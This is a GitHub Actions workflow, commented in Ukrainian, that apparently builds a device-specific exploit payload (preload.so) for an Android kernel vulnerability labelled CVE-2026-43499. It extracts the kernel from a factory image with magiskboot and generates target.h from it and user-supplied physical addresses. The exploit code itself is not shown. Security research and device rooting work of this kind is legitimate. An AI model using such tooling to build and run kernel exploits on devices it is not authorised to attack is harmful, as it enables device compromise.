name: Build CVE-2026-43499 preload.so

on:
  workflow_dispatch:
    inputs:
      factory_image_url:
        description: 'Пряме посилання на factory image (.zip або .tar.gz)'
        required: true
        default: 'https://dl.google.com/dl/android/aosp/blueline-pq3a.190505.001-factory-5dac7196.zip'
      p0_phys_offset:
        description: 'Фізичний зсув (наприклад, 0x80000000)'
        required: true
        default: '0x80000000'
      p0_kernel_phys_load:
        description: 'Фізична адреса завантаження ядра (наприклад, 0xc7800000)'
        required: true
        default: '0xc7800000'

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Android NDK
        uses: nttld/setup-ndk@v1
        id: setup-ndk
        with:
          ndk-version: r29
          add-to-path: false

      - name: Install dependencies (llvm, magiskboot, python3)
        run: |
          sudo apt-get update
          sudo apt-get install -y llvm python3 python3-pip unzip wget tar

          echo "Завантаження Magisk ZIP для отримання magiskboot..."
          # Використовуємо посилання на ZIP-архів Magisk з GitHub Releases
          wget -q https://github.com/topjohnwu/Magisk/releases/download/v27.0/Magisk-v27.0.zip -O /tmp/magisk.zip
          
          # Розпаковуємо архів
          mkdir -p /tmp/magisk_extracted
          unzip -q /tmp/magisk.zip -d /tmp/magisk_extracted
          
          # У ZIP-архіві бінарник magiskboot лежить у теці arm64-v8a/
          MAGISKBOOT_BIN="/tmp/magisk_extracted/arm64-v8a/magiskboot"
          
          if [ ! -f "$MAGISKBOOT_BIN" ]; then
            echo "Помилка: magiskboot не знайдено в ZIP-архіві!"
            find /tmp/magisk_extracted -name "magiskboot" -type f
            exit 1
          fi
          
          echo "Знайдено magiskboot: $MAGISKBOOT_BIN"
          # Копіюємо бінарник у /usr/local/bin
          sudo cp "$MAGISKBOOT_BIN" /usr/local/bin/magiskboot
          sudo chmod +x /usr/local/bin/magiskboot
          
          # Перевіряємо, що llvm-objdump та magiskboot доступні
          echo "Перевірка llvm-objdump:"
          llvm-objdump --version
          echo "Перевірка magiskboot:"
          magiskboot --help || true

      - name: Create profile.json from inputs
        run: |
          echo "Створення тимчасового профілю з вхідних даних..."
          cat <<EOF > dynamic_profile.json
          {
            "p0_phys_offset": "${{ github.event.inputs.p0_phys_offset }}",
            "p0_kernel_phys_load": "${{ github.event.inputs.p0_kernel_phys_load }}"
          }
          EOF
          
          echo "Згенерований dynamic_profile.json:"
          cat dynamic_profile.json

      - name: Download and extract Factory Image
        run: |
          mkdir -p firmware
          cd firmware
          
          echo "Завантаження factory image..."
          wget -q -O factory.zip "${{ github.event.inputs.factory_image_url }}"
          
          echo "Розпаковка архіву..."
          unzip -q factory.zip -d unzipped
          
          # Шукаємо вкладений архів (зазвичай Google пакує образи у image-*.zip)
          cd unzipped
          INNER_ZIP=$(find . -name "image-*.zip" -o -name "*.tar.gz" | head -n 1)
          
          if [ -z "$INNER_ZIP" ]; then
            echo "Вкладений архів не знайдено. Шукаємо boot.img..."
            find . -name "boot.img" -exec cp {} ../../boot.img \;
          else
            echo "Знайдено вкладений архів: $INNER_ZIP. Розпаковуємо..."
            if [[ "$INNER_ZIP" == *.zip ]]; then
              unzip -q "$INNER_ZIP" -d extracted_img
            else
              tar -xzf "$INNER_ZIP" -C extracted_img
            fi
            find extracted_img -name "boot.img" -exec cp {} ../../boot.img \;
          fi
          
          cd ../..
          if [ ! -f "boot.img" ]; then
            echo "Помилка: boot.img не знайдено у factory image!"
            exit 1
          fi
          echo "boot.img успішно витягнуто:"
          ls -lh boot.img

      - name: Unpack boot.img and extract kernel
        run: |
          mkdir -p boot_unpacked
          cd boot_unpacked
          cp ../boot.img .
          
          echo "Розпаковка boot.img за допомогою magiskboot..."
          magiskboot unpack boot.img
          
          # magiskboot створює файл 'kernel'. Перевіряємо, чи він стиснутий
          # і розпаковуємо його (gzip, LZ4, bzip2 тощо)
          if file kernel | grep -qi "gzip"; then
            echo "Виявлено стиснуте ядро (Gzip). Розпаковуємо..."
            mv kernel kernel.gz
            gunzip kernel.gz
          elif file kernel | grep -qi "LZ4"; then
            echo "Виявлено стиснуте ядро (LZ4). Розпаковуємо..."
            sudo apt-get install -y lz4
            mv kernel kernel.lz4
            lz4 -d kernel.lz4 kernel
          elif file kernel | grep -qi "bzip2"; then
            echo "Виявлено стиснуте ядро (Bzip2). Розпаковуємо..."
            mv kernel kernel.bz2
            bunzip2 kernel.bz2
          fi
          
          # Перевіряємо, чи ядро тепер має правильний заголовок
          if [ -f kernel ]; then
            cp kernel ../kernel.bin
            cd ..
            echo "Ядро успішно підготовлено:"
            ls -lh kernel.bin
          else
            echo "Помилка: не вдалося знайти ядро після розпаковки!"
            exit 1
          fi

      - name: Generate target.h
        env:
          ANDROID_NDK_HOME: ${{ steps.setup-ndk.outputs.ndk-path }}
        run: |
          echo "Генерація target.h з розпакованого ядра..."
          python3 generate_target.py \
            --boot kernel.bin \
            --profile dynamic_profile.json \
            -o source/src/target.h

      - name: Build preload.so
        env:
          ANDROID_NDK_HOME: ${{ steps.setup-ndk.outputs.ndk-path }}
        run: |
          # Використовуємо linux-x86_64 для prebuilt, оскільки GitHub Actions працює на Ubuntu
          make -C source clean preload NDK_PREBUILT=linux-x86_64

      - name: Upload target.h artifact
        uses: actions/upload-artifact@v4
        with:
          name: target-h-generated
          path: source/src/target.h
          if-no-files-found: error

      - name: Upload preload.so artifact
        uses: actions/upload-artifact@v4
        with:
          name: preload-so
          path: source/build/bin/preload.so
          if-no-files-found: error
